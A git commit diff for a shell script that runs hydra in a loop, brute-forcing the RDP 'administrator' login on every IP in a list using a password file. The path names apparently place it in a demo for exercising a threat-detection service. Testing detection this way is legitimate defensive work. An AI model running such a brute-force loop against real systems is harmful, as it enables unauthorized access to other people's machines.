f84230408fbcc992764af2383144de9fcd517ab8
Paul Hidalgo <me@paulhidalgo.net>
2018-07-04 13:17:34 +0800

    Bruteforce

--- bruteforce-rdp.sh
+++ bruteforce-rdp.sh
@@ -5,6 +5,6 @@ filename='/tools/ips.txt'
 filelines=`cat $filename`
 echo Start
 for ip in $filelines ; do
-        /tools/hydra/hydra -q -t 4 -f -l administrator -P ./fake/passwords.txt rdp://$ip >> /var/log/bruteforce-rdp &
+        /tools/hydra/hydra -q -t 4 -f -l administrator -P /tools/guardduty-demos/fake/passwords.txt rdp://$ip >> /var/log/bruteforce-rdp &
         echo "/tools/hydra/hydra -q -t 4 -f -l administrator -P ./fake/passwords.txt rdp://$ip"
 done
